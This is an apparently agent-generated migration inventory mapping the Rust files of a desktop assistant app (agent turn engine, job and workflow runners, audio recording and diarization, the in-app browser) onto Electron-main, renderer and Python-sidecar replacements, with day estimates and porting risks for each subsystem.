# Full per-file inventory — Rust → TS/Python migration

Companion to `electron-python-migration-plan-2026-08-22.md`. Generated 2026-08-22 by a 15-agent
review wave (10 inventory + 4 design + 1 coverage critic; 160/160 files verified covered).
Every behavior listed under **must preserve** was read out of the current code, not guessed.


# Part I — subsystem mapping tables

Roll-up of where the 161 Rust files land (128,018 LOC, 408 estimated dev-days incl. tests):

| Target layer | LOC today | est. days |
|---|---|---|
| electron-main | 104,902 | 326 |
| python-sidecar | 20,255 | 71 |
| renderer | 1,728 | 4 |
| electron-builtin | 625 | 6 |
| npm-or-pypi-lib | 502 | 2 |
| dropped | 6 | 0 |

Per-file detail (invariants to preserve, gotchas) lives in `electron-python-migration-inventory-2026-08-22.md`.

### A.1 Agent, turns & chat

The agent-turns-chat subsystem is the app's turn engine: `ask` (the one chat entrypoint) orchestrates a turn end-to-end — cancel-tree registration, TurnId event enveloping, phased room-lock discipline (no await under the lock), deterministic pure-save short-circuit, streaming through the Python sidecar as the SOLE engine (no native LLM fallback), a deferred post-answer image-grounding pass, an anti-fabrication gate checked against runtime ToolEffects, and room-pinned persistence so stragglers never write into a different room/epoch. Around it sit: `exec_tool`, a ~58-arm dispatcher implementing every built-in agent tool with centralized required-arg validation against the advertised schemas; the tools_catalog/spec builders and BUILTIN_TOOL_NAMES reservation set (MCP shadow protection); `cancel.rs`, a Weak-linked cancellation TREE where cancelling a parent stops all children and `guard_commit` blocks side-effects at commit time; `turn.rs`, the {runId, chatId, v} event envelope every ask-* event travels in; `agent_ui.rs`, the oneshot request/response bridge to the live webview with a 20s machine / 600s human-consent timeout split; `token_usage.rs`, the post-handoff estimated budget-bar snapshot; `chat.rs`, plain chat/message CRUD + pasted image/audio import; and `chat_commands*`, the 14 deterministic `#command` pipelines (full-ops windowing that NEVER truncates, map/reduce folding, stream watchdogs, think-span stripping). Nearly all of it is pure orchestration + string/JSON logic over the sidecar HTTP API and the DB — it ports to Electron-main TypeScript naturally, with the sidecar endpoints unchanged. The hard parts are wire-contract fidelity (event envelope, effects JSON, notice strings that other code matches literally) and Rust-specific mechanics (byte-offset string logic, Drop-based tree pruning) that have no direct JS equivalent.

| File | LOC | → Layer | Days | Replacement |
|---|---|---|---|---|
| `src/commands/agent.rs` | 7155 | electron-main | 15 | TypeScript module in Electron main: `ask` becomes an ipcMain handler that reads the DB via better-sqlite3-multiple-ciphers, calls the existing sidecar /run over HTTP (undici), and emits ask-* events via webContents.send; exec_tool becomes a typed dispatcher map validated with ajv against the same JSON schemas, exposed to the sidecar through the room MCP bridge (@modelcontextprotocol/sdk). Image downscale (downscale_png_b64) moves to sharp; grounding/vision calls stay sidecar HTTP endpoints. |
| `src/commands/chat_commands/generate.rs` | 989 | electron-main | 3 | TS functions on CmdCtx; #translate/#summarize/#minutes reuse map_windows/digest; #sketch calls the sidecar's structured-output endpoint with sketch_schema and merges scripts in TS; #research composes the existing web-search and save-page services; the transcript formatting that used spawn_blocking moves to a worker thread or the sidecar. |
| `src/commands/chat_commands.rs` | 785 | electron-main | 2 | TS module in Electron main: run_command as an ipcMain handler, CmdCtx as a class calling the sidecar's /generate, /generate_stream and structured endpoints over HTTP (undici streaming); watch_stream becomes Promise.race over the stream, an AbortSignal poll and idle/stop timers. |
| `src/commands/chat_commands/knowledge.rs` | 642 | electron-main | 2 | TS functions on the CmdCtx class, calling the DB layer directly for memory/files and the sidecar for generation; the #highlight path reuses the ported build_annotation/normalize_for_match utilities from agent.rs. |
| `src/cancel.rs` | 525 | electron-main | 2 | A TS CancelNode class: {cancelled: boolean, label, children: Set<WeakRef<CancelNode>>} plus a registry Map<runId, WeakRef>; workers poll node.cancelled or receive an AbortSignal derived from it (AbortController per node, parent.signal cascades via 'abort' listeners). Port all 13 tests to vitest. |
| `src/turn.rs` | 163 | electron-main | 0.5 | A ~60-line TS class in Electron main wrapping webContents.send('ask-delta'/'ask-step'/…, {runId, chatId, v}); envelope() stays a pure function so the wire shape is unit-testable without Electron. |
| `src/commands/agent_ui.rs` | 154 | electron-main | 0.5 | A TS Map<string, {resolve, timer}> of pending Promises in Electron main; request_ui becomes webContents.send('agent-ui-request', …) plus a Promise.race with a setTimeout; resolve_agent_ui becomes an ipcMain.handle that rejects unknown/expired ids with the exact NO_LONGER_WAITING sentence. |
| `src/commands/chat.rs` | 131 | electron-main | 0.5 | Thin ipcMain handlers over the DB layer (better-sqlite3-multiple-ciphers); Buffer.from(b64, 'base64') for decode; mime lookup via the mime npm package; STT enqueue posts to the Python sidecar's job queue (pywhispercpp). |
| `src/token_usage.rs` | 89 | electron-main | 0.25 | A ~30-line pure TS function returning the same snake_case JSON; alternatively fold it into the sidecar's usage.py since the shape is already defined there — but it must stay callable without a model turn. |

**Commands owned (15):** `ask`, `list_specialists`, `cancel_ask`, `handoff_chat`, `resolve_agent_ui`, `list_chats`, `create_chat`, `delete_chat`, `get_messages`, `rename_chat`, `delete_message`, `import_image_bytes`, `import_audio_bytes`, `list_chat_commands`, `run_command`

**Subsystem risks:** (1) Wire-contract drift is the top risk: the {runId, chatId, v} envelope, the ask-* event names, the effects column JSON ({boxes, annotation, edits, usage, agents}), the snake_case AskTokenUsage shape, and a dozen literal user-facing sentences (" *(stopped)*", 'Stopped — {what} was not saved.', NO_LONGER_WAITING) are matched byte-for-byte by the React frontend, by tests, and by other host code (the pure-save path strips the stopped suffix by literal). Effects JSON is also PERSISTED in existing .room files, so the shapes are frozen by the migration story, not just by the frontend. (2) Rust byte-offset string logic (closest_snippet, clamp_bytes vs clamp_chars, floor_boundary, tail_bytes, excerpt, partition_windows spans) will silently corrupt Hebrew/CJK/emoji text if ported with UTF-16 indices — this codebase is heavily Hebrew-exercised and has already shipped-and-fixed exactly this bug class once (byte-clamped memories). Every such helper needs a TextEncoder/char-array reimplementation plus its ported tests. (3) The cancel tree's correctness leans on Rust Drop for deterministic pruning (finished work's Weak dies immediately). JS GC gives no such timing: WeakRef-based pruning would let stopped_children() and StopReport report long-finished work as 'stopped' — a truthfulness regression the owner explicitly legislated against. The port needs explicit dispose() lifecycles (try/finally in every work-owning async fn), which touches every call site, not just cancel.ts. (4) exec_tool's ~58 arms call into nearly every other subsystem (files, browse, studios, jobs, memory, skills, MCP, downloads, drawing); this group cannot be completed independently — build the dispatcher, schemas, and BUILTIN_TOOL_NAMES reservation first against typed stubs, and gate completion on the other subsystems landing. The MCP-shadowing reservation must be enforced in the new @modelcontextprotocol/sdk bridge or third-party servers regain the consent-bypass hole (SEC-1b). (5) Concurrency-model translation: the Rust code's discipline is 'no await while holding the room mutex' + async tasks polling AtomicBools. In Electron main the mutex mostly disappears (single-threaded), but better-sqlite3 is SYNCHRONOUS — a long query inside ask's Phase 1/3 blocks the entire main process (IPC, menus, updater). Plan for the DB in a worker thread with an async facade, which reintroduces the very interleaving the room-lock discipline guarded against (RoomPin epoch checks become load-bearing again — port them exactly). (6) The turn engine encodes ~30 diagnosed live-QA bugs as ordering rules and honesty rules (Done("") = lost-not-empty, Failed keeps the partial and never re-runs a committed tool, deferred grounding, empty_reply_notice reading the jobs table, blocked-web-search ≠ empty web). None of these are visible in a happy-path port; the 108+ unit tests in this group are the only executable spec — port them to vitest FIRST and require them red-then-green, per the standing 'inert fixes' lesson. (7) Timeout budgets are cross-layer coupled: chat_commands' 960s non-streaming idle ceiling is sized against the sidecar's EXTERNAL_IDLE_SECS=900, agent_ui's 600s consent budget against human reading time, and stream_idle_secs reads the declared capability record. If the sidecar's budgets change during its expansion, these host-side numbers must move in step or long #research runs on CLI engines die mid-answer again.

### A.2 Jobs & workflows

The jobs-workflows subsystem is Arcelle's durability backbone: a checkpointed, resumable background-job engine (jobs.rs core: Lane-sloted step-DAG scheduler `plan_dispatch`/`run_plan`, dense-prefix cursors, panic-guaranteed runner epilogues), a single-slot FIFO queue (queue.rs) whose one dispatcher `start_job_from_row` rebuilds any of 8 job kinds from its persisted plan, a generation-pinned 30s workflow scheduler with DST-aware next-run math and at-most-one catch-up (scheduler.rs), a debounced auto-index waiter (auto_index.rs), and per-kind runners: deep_summary/studio/podcast (jobs.rs), whole-file map/compose/publish pass (file_pass.rs), recording reader with hallucination-proof turn-number timestamps (rec_read.rs), the 16-node-kind LLM workflow engine with compile/validate/consent-gated script nodes/agent tools/templates (workflow.rs, 5.8k lines), sandboxed script execution with uv/python3/node interpreter policy and auto-heal (script_run.rs), billed image/video generation with shot-list chaining (create.rs), and URL/yt-dlp downloads (download.rs). db/jobs.rs persists jobs+artifacts with heavily-commented invariants: five statuses only, parked_reason semantics, work_identity dedupe, history pruning. Model calls ALREADY route through the Python sidecar (/generate, /file_pass_map, /file_pass_section, /rec_read_map, /image_generate, /video_start|status, LangGraph chain nodes), so the rewrite is mostly orchestration-to-TypeScript in Electron main; the deep risk is the invariant density — most behaviors live in comments and ~150 unit tests, not in types. 27 tauri commands, ~18,077 LOC total, est. ~46.5 dev-days.

| File | LOC | → Layer | Days | Replacement |
|---|---|---|---|---|
| `src/commands/jobs/workflow.rs` | 5855 | electron-main | 12 | TS: zod discriminated union for NodeKind (unknown-keys-passthrough for old defs), pure validate/topo/compile with ported tests, node executor as a switch dispatching to sidecar fetch calls and the TS file/script/agent facilities, runner on the shared run_plan core. Agent tool wrappers and compose_workflow (LLM writes a def, validated before save) port as sidecar-backed functions. Largest single file in the subsystem — split the port into types/validate+compile/executor/orchestration/tools. |
| `src/commands/jobs.rs` | 2786 | electron-main | 6 | TypeScript module in Electron main: run_plan/plan_dispatch/dense_prefix as pure functions (waves via Promise.all), lanes as counters, cancel via AbortController + a shared boolean, job-progress via webContents.send. The panic guarantee becomes a try/catch/finally around every runner body plus an unhandledRejection guard writing the 'error' terminal state and pumping the queue. Model calls stay on the existing sidecar endpoints. |
| `src/commands/jobs/create.rs` | 2190 | electron-main | 6 | TS runner: fetch to the unchanged sidecar media endpoints, setInterval-free polling loop with AbortSignal, limits gating as pure functions with the ported doomed/chain tests. The shot-list planner (plan_shot_list, deterministic) and chain-gate state machine port as pure TS over the story DB tables. |
| `src/commands/jobs/script_run.rs` | 1963 | electron-main | 5 | TS in Electron main with child_process.spawn({detached:true}) and process.kill(-pid, 'SIGTERM'/'SIGKILL') for group kills; fs.mkdirSync(dir, {mode:0o700}); manifest parsing/interpreter policy/ring tails as pure TS. Keep in Node, not the sidecar: it is process supervision, not model/document work, and the sidecar must stay killable without orphaning user scripts. |
| `src/commands/jobs/file_pass.rs` | 1660 | electron-main | 4 | TS: build_pass_steps + artifact store as pure/DB code, step executor as fetch calls to the unchanged sidecar endpoints, publish via the TS file-write path. smart_filter/partition_windows come from the extraction module's port and must be byte-identical. |
| `src/db/jobs.rs` | 1175 | electron-main | 3 | TS repository over better-sqlite3-multiple-ciphers: statements port nearly 1:1; info.changes from .run() replaces conn.changes() for the phantom-transition gate; wrap dedupe/prune/insert-funnel in transactions. The schema (jobs, job_artifacts) migrates with the .room converter unchanged — plan/state stay opaque JSON text. |
| `src/commands/jobs/rec_read.rs` | 1046 | electron-main | 3.5 | TS: partition_turns/window_text/merge_findings/note_kind as pure functions with the ported tests; the map step calls the unchanged sidecar /rec_read_map; publish writes through the TS recording-meta editor. The turn-number-to-time resolution is plain code and ports 1:1. |
| `src/commands/jobs/queue.rs` | 531 | electron-main | 2 | Same TS module as the runner core: the slot is a plain variable (Node is single-threaded, no mutex), the dispatcher a switch on job.kind. Recreate the every-runner-frees-the-slot invariant as a unit test over a runner registry (each registered kind must resolve through a shared finally that frees+pumps) instead of source-text scanning. |
| `src/commands/jobs/scheduler.rs` | 334 | electron-main | 2 | TS with setInterval(30s) and a generation counter; next-run math with Luxon (DateTime.fromObject with zone, .isValid catches the DST gap, earliest offset preference for ambiguity). Keep timestamps as the same UTC strftime strings — they live in .room files. |
| `src/commands/jobs/download.rs` | 274 | electron-main | 1.5 | Thin TS runner over the download engines (which the web/yt-dlp subsystem rewrites separately — Node fetch streaming with byte caps, yt-dlp child process). URL parse via the WHATWG URL API. |
| `src/commands/jobs/auto_index.rs` | 263 | electron-main | 1.5 | TS debounced waiter (setTimeout + a generation integer); busy probes read the cancel registries the TS runner core keeps; model probe via the existing Ollama HTTP list. The decision function ports verbatim with its exhaustive test. |

**Commands owned (27):** `list_jobs`, `cancel_job`, `delete_job`, `start_deep_summary`, `start_podcast_audio_job`, `start_studio_job`, `resume_job`, `start_file_pass`, `start_download_job`, `start_create_job`, `story_film_plan`, `start_shot_list_job`, `validate_workflow`, `save_workflow`, `update_workflow`, `set_workflow_status`, `set_workflow_pinned`, `set_workflow_schedule`, `delete_workflow`, `list_workflows`, `get_workflow`, `get_workflow_schedule`, `get_workflow_runs`, `get_job_step_artifact`, `run_workflow`, `workflow_templates`, `compose_workflow`

**Subsystem risks:** (1) Invariant density: this subsystem's correctness lives in comments and ~150 unit tests (dense-prefix vs count, five-statuses-only, parked_reason lifecycle, queued-never-parked, refusal-under-the-minting-lock), not in types — a rewrite that ports signatures but not the test scenarios will look done and regress silently; budget explicit test-porting time in every file's estimate. (2) Durable-format traps in existing .room files: workflow definition JSON (serde tag/flatten/default semantics), job plan/state JSON, schedule param strings, and above all the file_pass resume gate hashing smart_filter's OUTPUT — a TS smart_filter differing by one trim/newline makes every paused pass unresumable; either port it byte-exactly (with the pinned-string tests) or ship the migration note that paused passes restart once. (3) The panic-guarantee must be re-engineered, not translated: Rust's catch_unwind + poisoned-mutex recovery becomes try/catch/finally plus an unhandledRejection backstop in Node; if any runner path can reject without reaching the shared epilogue, the single queue slot wedges for the session — the exact class of bug this code documents twice (spawn_job_runner header, rec_read's missing finish_and_pump). Make the epilogue structural (one wrapper all runners go through) and test it. (4) Concurrency model shift: Rust guards (room mutex, running_job mutex, atomic generation stamps) mostly vanish in single-threaded Node, but the transaction-shaped invariants remain — in-flight/queue-cap re-check + job insert + run-row insert + parked-sweep must be one better-sqlite3 transaction, and sync DB calls on the Electron main thread must stay out of hot loops or the whole UI's IPC stalls. (5) Cross-subsystem coupling: this group calls extraction (smart_filter/partition_windows), ollama probes/best_default, studio core, render_podcast_audio, web download engines + yt-dlp, import_download, capabilities/media_limits, the cancel tree, obs logging, and recording meta editing — the job runner is the hub; it cannot be ported and verified before those seams have at least stub-stable TS interfaces. Sequence it mid-to-late. (6) db/workflows.rs (workflows/workflow_runs/schedules tables, due_schedules, finish_workflow_run_by_job, set_workflow_run_status_by_job) is OUTSIDE this inventory's file list but load-bearing for workflow.rs, scheduler.rs and even db/jobs.rs (delete_job closes run rows) — confirm the db inventory group claims it or it is a coverage gap. (7) Billing-behavior sensitivity: create.rs's refuse-vs-drop matrix, never-retry rule, doomed-queue abandonment, and the accepted lossiness of the cloud-lane dense-prefix cursor (a finished compose re-runs = a re-billed call) are OWNER-DECIDED money behaviors; a well-meaning port that 'improves' checkpointing or retries changes what users pay. (8) Scheduler time semantics (Local-tz next-run with DST gap/ambiguity handling, missed-vs-late keyed on the previous tick's start, at-most-one opt-in catch-up, silent non-manual refusals that still advance next_run_at) are subtle and easy to flatten into 'node-cron', which supports none of them — hand-port with a real tz library and the existing test matrix. (9) Script-runner security invariants must survive: 0700 workspace, env without room path/key, imports only after exit 0, SHA-256 consent parking on changed bytes, process-group SIGTERM/SIGKILL, total heal budget — and the zsh -ilc interpreter probes intersect the known macOS TCC attribution trap; prefer provisioned/static paths in the Electron era. (10) Event-contract freeze: job-progress payload keys (jobId/done/total/finished/paused/failed/fileId — fileId auto-opens the viewer), workflow node events, workflows-changed, and the NEEDS_APPROVAL error-prefix protocol are unwritten contracts with the React frontend; rewiring src/api.ts to ipcRenderer must carry them unchanged or Activity/auto-open/park labels break in ways no backend test sees.

### A.3 Recording, audio & STT

Recording/audio/STT subsystem: a live meeting recorder (mic lane pushed from the WebView + system-audio lane via ScreenCaptureKit) with one engine thread per session that mixes both lanes onto a shared 16 kHz timeline, runs Silero VAD (energy-gate fallback) per lane, decodes phrases on a dedicated whisper.cpp (Metal) thread with a sticky-language policy, diarizes meeting voices with a bundled TitaNet-small ONNX (tract) + custom clustering/naming/split logic, cross-recognizes saved voices, suppresses mic echo of the meeting, live-translates via the local LLM, and persists WAV+meta into the encrypted room DB via crash-safe checkpoints. Around it: offline retranscribe, transcript editing (cuts/corrections/notes/chapters/highlights via a single serialized edit path), streaming dictation with LLM shaping, Whisper model download/delete lifecycle, waveform peaks, AVFoundation media probing, a Range-serving roommedia:// protocol, TTS proxying, and OpenRouter media-generation limit tables. 37 tauri commands, ~15.7k LOC. Rewrite splits: the whole audio/model pipeline (engine, VAD, diarization, whisper, probing, peaks) goes to the Python sidecar (pywhispercpp, onnxruntime, PyObjC AVFoundation); the command surface, model download, session registry, media streaming protocol and limits tables go to Electron main; ScreenCaptureKit is replaced by Electron's getDisplayMedia loopback in the renderer. Total ~52 senior-dev days.

| File | LOC | → Layer | Days | Replacement |
|---|---|---|---|---|
| `src/recording.rs` | 5392 | python-sidecar | 12 | A Python asyncio/threaded engine in the sidecar: numpy mixed timeline, silero-vad ONNX via onnxruntime for the VAD (same FRAME=512/hysteresis constants), pywhispercpp for decode on a dedicated thread, and a persistence contract that streams checkpoint PCM + meta JSON to Electron main (which owns the DB) over the sidecar HTTP/WS channel. Renderer mic PCM should go straight to the sidecar (WebSocket), not through Electron IPC base64. |
| `src/recording/diarize.rs` | 3050 | python-sidecar | 8 | Port the clustering/labeling/naming logic to Python+numpy verbatim (it is pure math over 192-float vectors) and run the SAME TitaNet-small ONNX with onnxruntime (the reference tract was validated against, cosine 1.000000). Feature extraction via a Python port of fbank.rs or kaldi-native-fbank's Python wheel, re-validated bit-close. |
| `src/commands/recording_cmds.rs` | 2330 | electron-main | 6 | ipcMain.handle surface in Electron main mirroring each command; session registry and cancel flags in main; long jobs (retranscribe, translate) dispatched to the sidecar with progress events; caffeinate replaced by powerSaveBlocker.start('prevent-app-suspension'); pure meta-editing logic (reflow_after_cuts, correct_words, merge_typed_since, at_time) ported to TS with its tests. |
| `src/commands/stt_cmds.rs` | 1095 | electron-main | 4 | Model download/validate/delete in Electron main (Node fetch streaming to .part, same magic/size checks, rename-into-place); dictation worker and transcription move to the sidecar (pywhispercpp) with dict-partial events over the event bridge; shaping stays a sidecar /generate call (it already routes through the sidecar). stt_effective_model resolution (downloaded-wins-over-bundled) reimplemented against Electron's userData/resources paths. |
| `src/stt.rs` | 942 | python-sidecar | 5 | pywhispercpp (whisper.cpp, Metal) in the sidecar with a thin module reproducing: warm-context cache with lookup-only locking, the four LangModes (language detect via whisper_lang_auto_detect on the decoded state), token-byte word merging, and the exact hallucination/junk/silence gates. Keep afconvert/avconvert subprocess decoding (Python subprocess) with 0o600 temp files. |
| `src/media_probe.rs` | 534 | python-sidecar | 3 | PyObjC in the sidecar: AVURLAsset/AVAssetTrack for probing and AVAssetImageGenerator for the last frame (synchronous accessors are fine on a worker thread — this is plain property access, not the SCK streaming-callback trap). Same owner-only tempfile discipline (os.open with 0o600). |
| `src/commands/media_limits.rs` | 453 | electron-main | 1.5 | A TS module in Electron main (or shared with the Create-page subsystem): fetch + zod-ish parsing + the same merge/staleness/loaded-flag semantics; plain Map cache. |
| `tests/rec_bench.rs` | 453 | python-sidecar | 1.5 | Port as a manual pytest/script beside the diar_bench port, sharing the DER scorer; the embedding-percentile calibration is the tool for re-validating the onnxruntime front-end swap. |
| `tests/diar_bench.rs` | 369 | python-sidecar | 2 | pytest -m acceptance port: the DER scorer is ~150 lines of numpy; drives the Python retranscribe. Consider pyannote.metrics for DER to cross-check the hand scorer. This is the regression gate for the whole diarization port — run it against ~/diarization-lab manifests before and after. |
| `src/commands/media.rs` | 311 | electron-main | 2 | protocol.handle('roommedia', ...) in Electron main serving Response objects from the same staged map; Range parsing ported as-is (Electron/Chromium sends Range for media seeks; Electron does not implement 206 for you). Clear on room close. |
| `src/commands/peaks.rs` | 289 | python-sidecar | 1.5 | Sidecar endpoint doing decode (afconvert path shared with STT) + numpy max-abs bucketing; the per-room cache and its (id,buckets,size_bytes) key live in Electron main next to the DB reads. Do NOT let the renderer decode (wavesurfer's default path is ~1 GB of Float32 for a 2 h meeting). |
| `src/recording/sck.rs` | 266 | electron-builtin | 3 | Electron >= 39 loopback audio: session.setDisplayMediaRequestHandler with audio:'loopback' (or 'loopbackWithMute'), renderer getDisplayMedia + AudioWorklet feeding the same PCM push path as the mic lane. Explicitly NOT PyObjC ScreenCaptureKit (callbacks never fire, pyobjc #647). |
| `src/commands/speech_cmds.rs` | 230 | electron-main | 1.5 | Thin ipcMain handlers in Electron main calling the existing sidecar /tts and /tts/voices endpoints (already Python); the offline-switch check and the mechanical redaction call move with the privacy subsystem's TS/Python home. |
| `src/recording/diarize/fbank.rs` | 154 | python-sidecar | 1 | Use librosa/NeMo's own featurizer or the kaldi-native-fbank Python wheel configured identically; re-run the parity check (max feature diff <1e-4, embedding cosine 1.000000) before accepting. |
| `src/recording/diarize/titanet.rs` | 93 | python-sidecar | 1 | onnxruntime InferenceSession (load once, share across threads), same preprocessing: per-feature mean/sd normalize, pad-to-16 with true length input, take output[1], L2-normalize. onnxruntime is the reference this graph was validated against. |

**Commands owned (37):** `rec_start`, `rec_push_audio`, `rec_pause`, `rec_resume`, `rec_set_live_translate`, `rec_set_live_stt`, `rec_retranscribe`, `rec_stop`, `rec_live_status`, `rec_get`, `rec_set_speaker_name`, `rec_read_start`, `rec_note_add`, `rec_note_set`, `rec_chapter_add`, `rec_chapter_set`, `rec_highlight_add`, `rec_item_delete`, `voices_list`, `voice_forget`, `rec_delete_range`, `rec_correct_range`, `rec_export_clean`, `rec_translate`, `stt_cancel_download`, `stt_status`, `stt_download_model`, `stt_delete_model`, `transcribe_audio`, `dict_start`, `dict_push_audio`, `dict_stop`, `dict_cancel`, `shape_text`, `speak_text_neural`, `list_neural_voices`, `audio_peaks`

**Subsystem risks:** (1) The engine's DB persistence crosses the new process boundary: today the Rust engine writes checkpoints/WAV/meta directly into the room SQLite under precise one-transaction invariants (append_rec_chunk is NOT idempotent; finalize must drop chunks atomically with the WAV write). In the rewrite the Python engine must persist through Electron main (which owns the DB) — a lossy or retried IPC hop reintroduces the exact crash bugs those transactions fixed (repeated audio stretches, half-second lane dropouts at checkpoint boundaries). Design the checkpoint RPC contract first, with the rescue-on-resume path (recover_rec_chunks before reading the WAV). (2) Diarization calibration is a house of cards: every threshold (gates, KNOWN_SAME=0.72, MIN_*_FRAMES, split-window sizes) is calibrated to the TitaNet-small ONNX + the exact fbank front end. onnxruntime is the validated reference for the model, but the Python front end must re-pass the bit-close parity check and the diar_bench acceptance run (DER ceiling + exact speaker counts on the AMI/meeting sets) or diarization silently degrades in ways unit tests cannot see. Stored VoicePrints in existing .room files must keep working (two print generations already coexist — the rewrite must not mint a third). (3) System-audio capture changes technology (SCK → Electron getDisplayMedia loopback): self-audio exclusion (excludesCurrentProcessAudio has no direct loopback equivalent — 'loopbackWithMute' mutes local playback instead), TCC permission flow, startup latency and per-buffer sample-rate honesty all differ. The engine's lane-resync, echo-suppression (sys lane 'cannot hear the room') and mic-death-watchdog logic bake in SCK's timing; each assumption needs re-verification. The known trap stands: do NOT try PyObjC ScreenCaptureKit (callbacks never fire). (4) Real-time audio through more hops: mic PCM currently flows WebView→tauri IPC (base64, 4x/s)→engine thread. Renderer→Electron→sidecar doubles serialization; route PCM directly renderer→sidecar (WebSocket/UDS) or the level meter, partials and VAD cadence lag. Python GIL contention between the tick/mix loop, relabel passes and whisper decode needs an explicit thread/process design (pywhispercpp releases the GIL in full(), numpy relabel mostly does, but the 40 ms relabel budget logic exists because this already ran hot in Rust). (5) pywhispercpp API coverage is unverified for the deep whisper.cpp features this pipeline needs: token byte access (BPE word merge for Hebrew), token p/plog, no_speech_probability, lang_detect on a decoded state (the Sniff/Watch confidence report), suppress_nst, beam params, and the Silero VAD context. Any gap means ctypes into whisper.cpp's C API — budget for it. Also the Metal teardown assert (unload context before exit) applies to the sidecar's shutdown path. (6) RecMeta JSON compatibility: existing rooms hold serde-generated camelCase JSON with skip-if-empty fields and BTreeMap-ordered keys (file-version history diffs it). The TS/Python reimplementation must parse all legacy shapes (missing fields default, retired fields ignored, DSP-generation voiceprints, segments with no words) and write stably-ordered JSON, or version history balloons and 'transcript data can't be read' errors appear on old files. (7) Event storm fidelity: the UI is driven by ~13 event channels (rec-level 5/s, rec-partial, rec-segment, rec-segment-drop, rec-relabel, rec-state, rec-source, rec-save-progress, rec-error, rec-retranscribe, rec-translate-progress, dict-partial, stt-download-progress/stt-progress). The sidecar→Electron→renderer bridge must preserve ordering per fileId (a partial arriving after its final re-paints a ghost line — a bug this code fixed twice). (8) Cross-subsystem seams to coordinate: speak_text_neural depends on the privacy redactor (another subsystem's TS/Python home); rec_stop chains into start_rec_read (AI jobs subsystem); rec_translate/shape_text call the model-routing layer; media_limits.rs actually belongs to the Create-page subsystem — make sure the fleet's coverage ledger assigns it exactly once. (9) Testing burden is the real schedule risk: this subsystem carries ~2500 lines of behavior-encoding unit tests (recording.rs, diarize.rs, stt.rs tests modules) plus two env-driven real-audio benches. Most encode fixed bugs (echo retraction, wrong-lock escape, checkpoint marks, edit claims). Port the tests with the code — the memory's standing lesson is that agent-ported 'fixes' ship inert without them.

### A.4 Browser, web & downloads

Browser-web-downloads subsystem (~10.9k LOC Rust + 1.5k LOC injected JS): Arcelle's private in-app browser (BROWSE-1..3c), the six browse_* agent tools, the SSRF-guarded first-party fetch/search stack, media downloads via a self-updating yt-dlp binary, and webview screenshotting. Architecture today: each browser tab is a child WKWebView (wry `incognito(true)` = non-persistent data store) driven ONLY via an injected page script + `evaluateJavaScript` (Tauri IPC can't reach remote origins); WebKit compiles a content-rule list for tracker + private-network sub-resource blocking; every outbound fetch goes through one literal URL guard + DNS resolve + connection pinning with hand-rolled redirect following; everything the agent does is journaled into the room DB while the web itself persists nothing. Rewrite shape: almost the whole subsystem lands in Electron main (TS). Electron makes three whole layers of workaround machinery deletable: (1) `executeJavaScript` awaits promises and reports exceptions, so the ticket/poll bridge, EVAL_LOST/EVAL_TIMED_OUT classification and much of wait_ready shrink dramatically; (2) `session.on('will-download')` exposes real progress + cancel + save path, deleting the stat-polling oversize watcher and the URL-keyed staging map; (3) `did-start-navigation` carries `isMainFrame` and `setWindowOpenHandler` intercepts popups, deleting the sub-frame-record-corruption defenses and NO_POPUPS_JS. What must NOT be lost: the privacy invariants (in-memory session verified against the live session, not asserted; private-range blocking for sub-resources INCLUDING WebSockets; DNS-pinned fetches with per-hop redirect re-checks), the outbound consent door, the journal contract, and the truthful-failure wording the agent tools depend on (dozens of live-QA bugs are encoded as exact behaviors). No Python needed here except keeping /web_search in the existing sidecar; yt-dlp stays an independently self-updating standalone binary spawned from Electron main.

| File | LOC | → Layer | Days | Replacement |
|---|---|---|---|---|
| `src/browser.rs` | 2897 | electron-main | 9 | A BrowserManager class in Electron main: one WebContentsView per tab on the BaseWindow, session.fromPartition(uniquePerSitting) WITHOUT the 'persist:' prefix (in-memory); verify ephemerality against the live session (in-memory sessions report no storagePath) instead of trusting the flag. did-start-navigation (has isMainFrame) + will-navigate for the guard, setWindowOpenHandler(()=>({action:'deny'})) + navigate for popups, session.on('will-download') with DownloadItem.setSavePath/on('updated')/cancel() for downloads. executeJavaScript replaces the entire ticket bridge for async ops. |
| `src/commands/browse.rs` | 1699 | electron-main | 6 | IPC handlers (ipcMain.handle) + a browseTool executor module in Electron main. Formatters, consent door, classify logic port line-for-line to TS; look pipeline uses webContents.capturePage + sharp for downscale; browser_info poll can largely become event-driven (page-title-updated, did-navigate) pushed to the renderer instead of 1200ms polling. |
| `src/browser/page.js` | 1539 | renderer | 3 | Port near-verbatim as the preload script of the browser WebContentsView (contextIsolation on, exposed via a private bridge). Keep snapshot/read/find/act/capture/info and the driver.ts mark vocabulary; DELETE the begin/take ticket machinery and DOC_ID plumbing (async ops return real promises to executeJavaScript; navigation loss surfaces as a rejected promise + did-navigate event); replace the Escape-latch info-poll ride-along with a real ipcRenderer push. |
| `src/web/fetch.rs` | 977 | electron-main | 4 | TS on undici: an Agent whose connect.lookup is pinned per request to the pre-checked address, redirect:'manual' with a hand-rolled hop loop re-running the guard (identical structure); TextDecoder/iconv-lite via whatwg encoding labels for charsets; streams with byte caps; the caption scraper and meta scanner port as string-walking functions with their test tables. |
| `src/commands/ytdlp.rs` | 949 | electron-main | 3 | TS port spawning the SAME standalone yt-dlp_macos binary via child_process (readline over stdout/stderr replaces the tokio line loops; AbortController + kill for cancel). Keep the binary-download + self-update logic exactly (do NOT pip-bundle yt-dlp into the PyInstaller sidecar — it would freeze to app release cadence and the monthly YouTube 403 wave returns). ffmpeg discovery and all parsers port as pure functions with their test tables. |
| `src/browser/rules.rs` | 656 | electron-main | 1.5 | @ghostery/adblocker-electron (full EasyList, replaces the curated tracker table) plus a small custom session.webRequest.onBeforeRequest handler for the private-range policy that calls the SAME host-classification code as the fetch guard (one shared TS module instead of two parallel encodings). Chromium's webRequest sees every sub-resource including WebSocket connects. |
| `src/commands/browse/search.rs` | 604 | electron-main | 2.5 | IPC handlers in Electron main: sidecar /web_search over HTTP, undici-guarded preview fetches with p-limit concurrency, data-URL encoding, Ollama call for the summary via the existing ollama client's TS successor. Cache tables stay in the room DB. |
| `src/commands/browse/saved.rs` | 465 | electron-main | 2 | TS port in Electron main calling @mozilla/readability + linkedom (or the page's own DOM via executeJavaScript running Readability in-page) + turndown for Markdown; DB writes via the new DB layer; heavy extraction in a worker thread if parsing 4MB SPA markup stalls the main process. |
| `src/web/search.rs` | 371 | electron-main | 0.5 | A 100-line searchClient.ts calling the existing sidecar over localhost HTTP; render/provenance string builders port directly. |
